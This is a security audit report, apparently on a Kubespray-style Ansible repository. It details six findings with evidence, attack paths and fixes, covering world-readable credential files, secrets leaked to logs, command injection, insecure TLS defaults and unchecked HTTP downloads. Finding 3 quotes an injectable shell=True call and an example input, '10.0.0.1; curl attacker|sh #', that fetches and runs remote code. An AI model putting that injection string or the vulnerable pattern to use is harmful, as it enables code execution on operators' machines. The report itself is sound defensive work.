# Security research findings (2026-11-20) — injection / crypto / secrets / logic

Focus of this pass: command/template injection, cryptography & secrets handling, and related logic flaws.
Already-known items **1–13** from prior reviews are not re-reported.

## Findings

### 1. World-readable cloud credentials and Secret manifests under `/etc/kubernetes` (high)

- **Primary files:** `roles/kubernetes/preinstall/tasks/0050-create_directories.yml`, `roles/kubernetes-apps/cloud_controller/oci/tasks/main.yml`
- **Evidence:**
  - `roles/kubernetes/preinstall/tasks/0050-create_directories.yml:2-25` — `kube_config_dir` (`/etc/kubernetes`) created `mode: 0755` (world-traversable)
  - `roles/kubernetes-apps/cloud_controller/oci/tasks/main.yml:5-26` — OCI CCM config and manifests written `mode: 0644`
  - `roles/kubernetes-apps/cloud_controller/oci/templates/controller-manager-config.yml.j2:25-26` — embeds `oci_private_key` in plaintext
  - `roles/kubernetes-apps/cloud_controller/oci/templates/oci-cloud-provider.yml.j2:1-8` — Secret YAML embeds base64 of that config
  - Same 0644 Secret-manifest pattern: `roles/kubernetes-apps/csi_driver/cinder/tasks/main.yml:29-36` + `cinder-csi-cloud-config-secret.yml.j2:10`, `roles/kubernetes-apps/csi_driver/azuredisk/tasks/main.yml:18-25`, `roles/kubernetes-apps/csi_driver/gcp_pd/tasks/main.yml:21-27`, `roles/kubernetes-apps/external_cloud_controller/vsphere/tasks/main.yml:13-20` + `external-vsphere-cpi-cloud-config-secret.yml.j2:9-11` (plaintext password in `stringData`), `roles/network_plugin/canal/tasks/main.yml:68-74` + `canal-secret-calico-etcd.yml.j2:16` (etcd private key)
  - Contrast (correct): OpenStack external CCM uses `mode: 0640` (`roles/kubernetes-apps/external_cloud_controller/openstack/tasks/main.yml:21-26`)
- **Attack path:** Operator enables OCI CCM, Cinder/Azure/GCP CSI, vSphere external CPI, and/or Canal. Control-plane node has `/etc/kubernetes` at 0755. Any local unprivileged OS user (or hostPath-mounted workload) reads world-readable files such as `/etc/kubernetes/controller-manager-config.yml`, `/etc/kubernetes/oci-cloud-provider.yml`, `/etc/kubernetes/cinder-csi-cloud-config-secret.yml`, `/etc/kubernetes/external-vsphere-cpi-cloud-config-secret.yml`, or `/etc/kubernetes/canal-secret-calico-etcd.yml`, recovering cloud API credentials or etcd client private keys. Cloud creds yield infra compromise (volumes, LB, instances); etcd client key yields cluster secret exfiltration.
- **Impact:** Local privilege boundary bypass on control-plane hosts → cloud account and/or full Kubernetes secret compromise.
- **Remediation:** Create `kube_config_dir` as `0700`/`0750`; write all Secret/credential files as `0600`/`0640` (match OpenStack CCM); delete plaintext credential files after applying Secrets; avoid leaving applied Secret YAML on disk.
- **Not a duplicate of #5/#12/#13:** On-disk permissions for runtime credential material, not Ansible log leakage, Hetzner RBAC, or Terraform SSL skip.

### 2. Secret-bearing Ansible tasks lack `no_log` beyond kubeadm join tokens (high)

- **Primary files:** `roles/etcd/tasks/gen_certs_script.yml`, `roles/kubernetes/control-plane/tasks/kubeadm-secondary.yml`, `roles/network_plugin/canal/tasks/main.yml`
- **Evidence (no `no_log` on secret-bearing tasks):**
  - `roles/etcd/tasks/gen_certs_script.yml:75-112` — `slurp` of `ca-key.pem` and member/admin private keys into `etcd_master_certs` then `copy` of decoded key material
  - `roles/network_plugin/canal/tasks/main.yml:43-47` — `slurp` of etcd `key.pem` into `etcd_key_file` (later rendered into Secret)
  - `roles/kubernetes/control-plane/tasks/kubeadm-secondary.yml:13-26` — `kubeadm ... upload-certs` stdout registered; `set_fact: kubeadm_certificate_key` from last line (control-plane join key)
  - `roles/kubernetes/control-plane/tasks/kubeadm-setup.yml:168-192` — `kubeadm init --upload-certs` stdout parsed for `--certificate-key` without `no_log`
  - `roles/kubernetes/control-plane/tasks/encrypt-at-rest.yml:10-28` — slurp/`set_fact` of encryption-at-rest key material
  - `roles/kubernetes-apps/csi_driver/cinder/tasks/main.yml:23-26`, `azuredisk/tasks/main.yml:12-15`, `gcp_pd/tasks/main.yml:15-18`, `cloud_controller/oci/tasks/main.yml:12-19` — cloud credential slurps/`set_fact` without `no_log`
  - `roles/kubernetes/client/tasks/main.yml:52-61` — slurp of `admin.conf` into facts without `no_log`
  - `roles/kubernetes/tokens/tasks/gen_tokens.yml:45-64` — tarball of known_tokens.csv synced via base64 in shell without `no_log`
  - Contrast: `roles/etcd/tasks/gen_nodes_certs_script.yml:21` and vsphere CSI secret apply already use `no_log: "{{ not (unsafe_show_logs|bool) }}"`
- **Attack path:** Operator runs cluster.yml with default Ansible logging (or CI that archives ansible/ARA logs). Task results include base64 private keys, certificate-key, encryption keys, cloud passwords, and admin kubeconfig content. Anyone with log access (CI artifacts, shared jump host history, log aggregator) recovers material sufficient to join as control-plane (`certificate-key` + existing token/discovery), mint etcd clients, decrypt secrets-at-rest, or call cloud APIs.
- **Impact:** Offline exfiltration of cluster and cloud secrets from install logs; distinct and broader than join-token leakage alone.
- **Remediation:** Add `no_log: "{{ not (unsafe_show_logs|bool) }}"` to every task that registers/copies/templates private keys, certificate-key, encryption keys, cloud credentials, tokens CSV, or admin kubeconfig; prefer `loop_control.label` that never includes `content`.
- **Not a duplicate of known #5:** #5 is kubeadm **bootstrap tokens** only; this covers etcd CA keys, upload-certs certificate-key, encryption keys, cloud credentials, and admin kubeconfig.

### 3. `inventory_builder` command injection via `shell=True` + unquoted IP (high)

- **Primary file:** `contrib/inventory_builder/inventory.py`
- **Evidence:** `contrib/inventory_builder/inventory.py:236-240`
  ```python
  cmd = ("ssh -oStrictHostKeyChecking=no "
         + access_ip + " 'hostname -s'")
  next_host = subprocess.check_output(cmd, shell=True)
  ```
- **Attack path:** Feature is enabled with `USE_REAL_HOSTNAME=True`. Inventory IPs/`access_ip` values come from an untrusted source (compromised CMDB export, malicious collaborator paste, poisoned automation input). Example argv: `10.0.0.1; curl attacker|sh #`. Because `access_ip` is concatenated into a shell string, the payload executes on the **Ansible controller** as the operator user before SSH runs. Separately, `StrictHostKeyChecking=no` disables SSH host-key verification for that lookup.
- **Impact:** Remote code execution on the Ansible controller (beyond intended node become), enabling theft of all inventories/credentials the operator can reach and poisoning of other clusters.
- **Remediation:** Never use `shell=True`; pass argv list to `subprocess` with the IP as a single argument; validate IPs with `ipaddress`; keep host-key checking enabled or pin known_hosts.
- **Not a duplicate of #2:** This is controller RCE via inventory helper, not Ansible SSH `host_key_checking=False` in `ansible.cfg`.

### 4. vSphere CPI/CSI default `insecure-flag=true` (medium)

- **Primary files:** `roles/kubernetes-apps/external_cloud_controller/vsphere/defaults/main.yml`, `roles/kubernetes-apps/csi_driver/vsphere/defaults/main.yml`
- **Evidence:**
  - `roles/kubernetes-apps/external_cloud_controller/vsphere/defaults/main.yml:3` — `external_vsphere_insecure: "true"`
  - `roles/kubernetes-apps/csi_driver/vsphere/defaults/main.yml:3` — `external_vsphere_insecure: "true"`
  - Rendered into `external-vsphere-cpi-cloud-config.j2` / `vsphere-csi-cloud-config.j2` as `insecure-flag`
- **Attack path:** Operator enables external vSphere CPI/CSI without overriding the default. CCM/CSI talk to vCenter with TLS verification disabled. On-path MITM between nodes and vCenter presents a fake vCenter, observes/alters API calls (credentials already on the wire from finding #1 style files), and can influence volume/node lifecycle operations.
- **Impact:** Credential theft and cloud-API manipulation via TLS MITM for default vSphere addon config.
- **Remediation:** Default `external_vsphere_insecure` to `"false"`; require explicit opt-in for insecure TLS.
- **Not a duplicate of known #13:** #13 is Terraform `allow_unverified_ssl` at provision time; this is the **runtime** Kubernetes CPI/CSI default.

### 5. Heketi StorageClass embeds admin key over cleartext HTTP (medium)

- **Primary file:** `contrib/network-storage/heketi/roles/provision/templates/storageclass.yml.j2`
- **Evidence:**
  - `contrib/network-storage/heketi/roles/provision/templates/storageclass.yml.j2:10-12` — `resturl: "http://..."`, `restuserkey: "{{ heketi_admin_key }}"`
  - Sample inventory ships a fixed key: `contrib/network-storage/heketi/inventory.yml.sample:3`
- **Attack path:** Operator deploys contrib Heketi. StorageClass is cluster-scoped and commonly readable by authenticated users. Attacker lists StorageClasses, reads `restuserkey`, and calls the Heketi HTTP API (no TLS) as admin to manipulate Gluster volumes (delete/create/attach), enabling data destruction or malicious volume attachment to attacker pods.
- **Impact:** Storage admin compromise and potential cross-tenant volume access; network MITM can also steal the key in transit.
- **Remediation:** Store the key in a Secret referenced by a CSI/provisioner config, not in StorageClass parameters; use HTTPS; rotate sample keys out of tree.
- **Not a duplicate of prior findings:** Contrib storage path; not covered by terraform SSH or kubeadm token issues.

### 6. NVIDIA GTX driver install downloads over HTTP without integrity checks into a privileged DaemonSet (medium)

- **Primary files:** `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/defaults/main.yml`, `roles/kubernetes-apps/container_engine_accelerator/nvidia_gpu/templates/nvidia-driver-install-daemonset.yml.j2`
- **Evidence:**
  - `defaults/main.yml:5` — `nvidia_gpu_gtx_base_url: http://us.download.nvidia.com/...`
  - `tasks/main.yml:19-22` — GTX flavor builds download URL from that HTTP base
  - `nvidia-driver-install-daemonset.yml.j2:41-79` — DaemonSet `hostPID: true`, `privileged: true`, mounts host `/`, runs installer with `NVIDIA_DRIVER_DOWNLOAD_URL`
- **Attack path:** Operator sets `nvidia_accelerator_enabled` / `nvidia_driver_install_container` with `nvidia_gpu_flavor=gtx`. Nodes pull the `.run` installer over HTTP with no checksum. Network MITM replaces the installer; privileged DaemonSet executes it as root with host rootfs mounted → persistent node rootkit on every GPU node.
- **Impact:** Cluster-wide node compromise via supply-chain MITM when the GTX path is enabled.
- **Remediation:** Use HTTPS only; pin SHA256 of the driver artifact and verify before exec; drop host root mount / privilege where possible.
- **Not a duplicate:** Optional addon; core kube binary downloads already use HTTPS+checksums.

## Explicitly reviewed and not reported (incomplete chain, operator-trusted inventory only, or duplicate)

- Generic Ansible `shell:` interpolation of operator-controlled inventory vars without a confused-deputy/cross-trust boundary.
- `validate_certs: no` on localhost/apiserver health checks (self-signed bootstrap; MITM already requires host/network control overlapping SSH trust).
- `download_validate_certs` defaults true; kube binary URLs HTTPS with sha256 maps.
- `certificates_key_size` default 2048; no MD5/SHA1 trust anchors found for cluster certs.
- `contrib/terraform/terraform.py` — JSON tfstate parse only; no `shell=True`.
- Dockerfile kubectl download is HTTPS; docker apt key piped over HTTPS (weaker apt-key pattern but no standalone MEDIUM+ chain beyond normal supply-chain).
- `.gitlab-ci.yml` / `scripts/premoderator.sh`: `GITHUB_TOKEN` in query string is poor practice, but `ci-authorized` job has `only: []` (disabled); PR jobs rebase untrusted refs but run in isolated CI runners without a new secret-exfil channel beyond normal CI token scope.
- No GitHub `pull_request_target` workflows in-tree (`.github/` is issue templates only).
- `dashboard_enabled` default false; in-tree dashboard ClusterRoleBinding is not cluster-admin (contrib `misc/clusteradmin-rbac.yml` is opt-in).
- ArgoCD admin password in a `shell:` task lacks `no_log`, but only when `argocd_admin_password` is explicitly set (operator-supplied); omitted as lower novelty vs findings #1–#2.
